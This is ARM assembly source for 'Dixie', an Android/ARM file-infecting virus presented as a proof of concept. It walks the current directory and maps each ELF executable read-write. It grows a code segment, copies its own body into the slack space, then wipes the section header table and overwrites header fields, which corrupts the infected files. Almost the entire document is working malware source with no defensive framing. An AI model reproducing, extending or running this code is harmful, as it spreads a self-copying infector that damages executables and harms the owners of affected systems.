; Dixie: Android/ARM VxD Proof Of Concept
; References:
;  - Silvio Cesare: http://vxheaven.org/lib/static/vdat/tuunix01.htm
;  - Mark Ludwig: http://vxheavens.com/lib/vml01.html
;  - ARM: http://infocenter.arm.com
.text
.global _start
_start:
0: // Self segment Read and Write Permissions.
  and r0, pc, $0xf000        // PC 4049 bytes PAGE_SIZE aligment (lower address)
  bl _fullPagePermissions
  cmp r7, $0
  bne _End_Program
1: // Open Actual directory to loop through his entries.
  adrl r0, actualdir
  bl _openDir
  cmp r7, $0
  ble _End_Program
  mov r5, r7            // r5: actualdir file handle.
2: // While we have antries to work with, check and try to infect.
  _WhileDirEntries:
    // getdents sycall call
    mov r0, r5
    bl _getDirEntries
    cmp r7, $0
    ble _End_Program
    mov r6, r7          // r6: bytes readed into linux_dirent buffer
    mov r0, $0x00
    mov r4, r0
    _WhileEntriesToRead:
      // Extract file name address from linux_dirent buffer
      mov r1, r6
      bl _getEntryFileName
      cmp r7, $0x00      // r7: file name address.
      beq _WhileDirEntries  // no more entries to read.
      // ?¿ xD
      mov r0, r7
      bl _TryToInoculate
      // now try with the next entry (counter++)
      mov r0, r4
      add r0, r0, $1
      add r4, r4, $1
      b _WhileEntriesToRead
    b _WhileDirEntries
_End_Program:
  mov r7, $1
  mov r0, $0
  svc 0

/*********************/
/** File Operations **/
/*********************/
// in: r0 file name address, out: r7 file handle or -N error code
_openFile:
  push {r1-r6, lr}
  mov r1, $2      // open for Read and Write.
  sub r2, r2, r2  // O_RDWR
  mov r7, $0x05
  svc 0
  mov r7, r0
  pop {r1-r6, pc}


// in: r0 file handle, out: r7 file length or -N error code
_getFileLength:
  push {r1-r6, lr}
  mov r1, $0
  mov r2, $2    // SEEK_END
  mov r7, $0x13
  svc 0
  mov r7, r0
  pop {r1-r6, pc}

// in: r0 file handle
_closeFile:
  push {r1-r6, lr}
  mov r7, $0x06
  svc 0
  pop {r1-r6, pc}

/**************************/
/** Directory Operations **/
/**************************/
// in: r0 dir name address, out: r7 file handle or -N error code
_openDir:
  push {r1-r6, lr}
  mov r7, $5
  sub r1, r1, r1  // O_RDONLY
  sub r2, r2, r2
  svc 0
  mov r7, r0
  pop {r1-r6, pc}

// in: r0 file handle, out: r7 bytes readed or -N error code (into hardcoded linux_dirent buffer)
_getDirEntries:
  push {r1-r6, lr}
  mov r7, $141
  adrl r1, linux_dirent_buffer
  adrl r2, linux_dirent_buffer_size
  ldr r2, [r2]
  svc 0
  mov r7, r0
  pop {r1-r6, pc}

// in: r0 N linux_dirent entry to look for, out: r7 name address or 0
_getEntryFileName:
  push {r2-r6, lr}
  adrl r6, linux_dirent_buffer
  mov r5, $0
  mov r7, $0
  _DoWhileEntries:
    cmp r7, r0        // n entry found ?
    beq _endWithSuccess
    ldrh r3, [r6, $0x08]
    add r5, r5, r3      // size++
    add r7, r7, $1      // counter++
    add r6, r6, r3      // offset++
    cmp r5, r1        // offset >= buffer size ?
    bge _endWithError
    b _DoWhileEntries
  _endWithError:
  sub r7, r7, r7
  b _endDoWhile
  _endWithSuccess:
  add r7, r6, $0x0A
  _endDoWhile:
  pop {r2-r6, pc}

/***********************/
/** Memory Operations **/
/***********************/
// in: r0 file handle, r1 file length, out: r7 memory address or -N error code
_mapFileInMemory:
  push {r2-r6, lr}
  mov r5, $0x00  // start mapping file from offset 0.
  mov r4, r0    // file handle to map.
  mov r3, $0x01  // MAP_SHARED
  mov r2, $0x03  // PROT_READ & PROT_WRITE
          // r1: file length.
  mov r0, $0x00  // map into NULL base address (kernel chooses the address).
  push {r0-r5}
  mov r7, $0xC0
  svc 0
  mov r7, r0
  pop {r0-r5}
  pop {r2-r6, pc}

// in: r0 memory mapped base address, r1 memory mapped size (bytes)
_unmapFileFromMemory:
  push {r1-r6, lr}
  mov r7, $0x5b
  svc 0
  pop {r1-r6, pc}

// in: r0 memory address to work with (1 page at a time), out: r7 0 on success
_fullPagePermissions:
  push {r1-r6, lr}
  adrl r1, page_size
  ldr r1, [r1]  // 0x1000 page size.
  mov r2, $7      // PROOT_READ | PROT_WRITE | PROT_EXEC
  mov r7, $0x7d
  svc 0
  mov r7, r0
  pop {r1-r6, pc}

// in: r0 base address of unused space to work with, out: r7 always 0
_CopyEvilCode:
  push {r1-r6, lr}
              // r0: write start point
  adrl r1, _start      // r1: read start point
  adrl r2, _end_code
  sub r2, r2, r1      // r2: bytes to read/write
  mov r3, $0
  _FillLoop:
    ldr r4, [r1, r3]
    str r4, [r0, r3]
    cmp r3, r2
    beq _EndFillLoop
    add r3, r3, $1
    b _FillLoop
  _EndFillLoop:
  nop
  _final_party_fireworks:
  and r0, r0, $0xf0000000
  ldr r1, [r0, $32]  // e_shoff
  add r1, r0
  ldrh r2, [r0, $46] // e_shentisize
  ldrh r3, [r0, $48] // e_shnum
  mul r4, r2, r3
  mov r5, $0
  _aa1:
    str r5, [r1, r5]
    add r5, $1
    cmp r5, r4
    blt _aa1
  _aa2:
    mov r1, $123
    str r1, [r0, $20]
    str r1, [r0, $32]
    str r1, [r0, $40]
    str r1, [r0, $46]
    str r1, [r0, $48]
    str r1, [r0, $50]
  mov r7, $0
  pop {r1-r6, pc}

/********************************/
/** ELF File Format Operations **/
/********************************/
// in: r0 base memory address where file was mapped to, out: r7 0 if valid for infections
_validELF:
  push {r1-r6, lr}
  adrl r7, sanity
  ldr r7, [r7]
  // reading ehdr fields
  ldr  r1, [r0, $0x00]    // EI_MAG
  ldrb r2, [r0, $0x04]    // EI_CLASS
  ldrb r3, [r0, $0x05]    // EI_DATA
  ldrb r4, [r0, $0x06]    // EI_VERSION
  ldrh r5, [r0, $0x10]    // e_type
  // checking values
  sub r7, r7, r1      // \x177ELF ?
  sub r7, r7, r2      // ELFCLASS32 ?
  sub r7, r7, r3      // ELFDATA2LSB ?
  sub r7, r7, r4      // EV_CURRENT ?
  sub r7, r7, r5      // ET_EXEC ?
  pop {r1-r6, pc}

// in: r0 file name address, out: r7 0 on success
_TryToInoculate:
  push {r1-r6, lr}
  bl _openFile
  cmp r7, $0
  ble _just_return
  _IfOpened:
    mov r6, r7    // r6 file handle to reuse in other file operations.
    // getting file size to correctly map them in memory,
    mov r0, r7
    bl _getFileLength
    cmp r7, $0
    ble _close_file
    mov r5, r7    // r5 file size to reuse in other file operations.
    // mmap2 call to map file in memory.
    mov r0, r6
    mov r1, r7
    bl _mapFileInMemory
    cmp r7, $0
    blt _close_file
    _IfMapped:
      mov r4, r7  // r4 memory address where file was mapped to reuse in ELF operations.
      // Checking if ELF has valid format to inject our code.
      mov r0, r7
      bl _validELF
      cmp r7, $0
      bne _unmap_file
      _IfValidForInfection:
        // Look for phdr PT_LOAD type and update sizes if has correct format.
        mov r0, r4
        bl _UpdatePTLOADProgramHeader
        cmp r7, $0
        beq _unmap_file
        _IfvalidPTLOAD:
          mov r0, r7
          bl _CopyEvilCode
  _unmap_file:
    mov r0, r4
    bl _unmapFileFromMemory
  _close_file:
    mov r0, r6
    bl _closeFile
  _just_return:
  pop {r1-r6, pc}

// in: r0 base memory address where file was mapped to, r7 offset where unused space start or 0 on error
_UpdatePTLOADProgramHeader:
  push {r1-r6, lr}
  ldr r1, [r0, $28]           // e_phoff
  add r1, r1, r0              // r1: program header entry offset
  mov r2, $1                  // program header entry counter definition
  mov r3, $0                // program header index return value definition
  for_phdrs:
    ldr r4, [r1]          // p_type
    cmp r4, $1            // PT_LOAD ?
    bne try_with_next_phdr_entry
    if_LOAD_section:
      ldr r4, [r1, $24]      // p_flags
      ands r5, r4, $1        // PV_X ?
      beq try_with_next_phdr_entry
      if_EXEC:
        ldr r4, [r1, $16]    // p_filesz
        ldr r5, [r1, $20]    // p_memsz
        subs r4, r5        // p_filesz == p_memsz
        bne try_with_next_phdr_entry
        if_CONGRUENT_SIZES:
          ldr r4, [r1, $4]  // p_offset
          cmp r4, $0      // first segment ?
          bne try_with_next_phdr_entry
          if_OFFSET0:
            moveq r7, r2
            b _endFor_phdrs_success
    try_with_next_phdr_entry:
    ldrh r4, [r0, $42]
    add r1, r4            // next program header entry
    ldrh r4, [r0, $44]
    add r2, $1            // counter ++
    cmp r2, r4            // last entry ?
    ble for_phdrs
    sub r7, r7            // finish with error
    b _endFor_phdrs_finally
  _endFor_phdrs_success:
  // [i] Notes: freespace_in_segment_for_injection = ((((size >> 12) + 1) << 12) - size)
  // [i]     Assuming 0x1000 page size & base address 0xXXXXX000 (the most usual case but not ever is true)
  // [i]     ARM have not DIV/MOD instructions, I'm to lazy to make the formula without this and i don't want to c&p others work :(

  // r1:     offset of program (target PT_LOAD) header entry.
  ldr r2, [r1, $16]          // filesz
  lsr r3, r2, $12
  add r3, $1
  lsl r3, $12
  sub r3, r3, r2            // r3: available space in segment for injection

  // getting evil code size to chech if we have enough space.
  adrl r2, _start
  adrl r4, _end_code
  sub r2, r4, r2            // r2: evil code size
  // have we ?
  cmp r3, r2
  ble if_enough_else
  if_enough:
    ldr r3, [r1, $16]
    add r2, r3
    str r2, [r1, $16]        // p_filesz += evil_size
    str r2, [r1, $20]        // p_memsz +=  evil_size
    //  unused space start calculation
    ldrh r4, [r0, $44]        // e_phnum
    ldrh r5, [r0, $42]        // e_phentsize
    ldr r6, [r0, $28]        // e_phoff
    mul r4, r5
    add r7, r4, r6
    add r7, r0            // .text unused space start address
    b _endFor_phdrs_finally
  if_enough_else:
    sub r7, r7
  _endFor_phdrs_finally:
  pop {r1-r6, pc}

/*************************************/
/** Data space inside .text section **/
/*************************************/
actualdir: .asciz "."
linux_dirent_buffer: .space 0x10A
linux_dirent_buffer_size: .word 0x10A
page_size: .word 0x1000
sanity: .word 0x464c4584

_end_code:
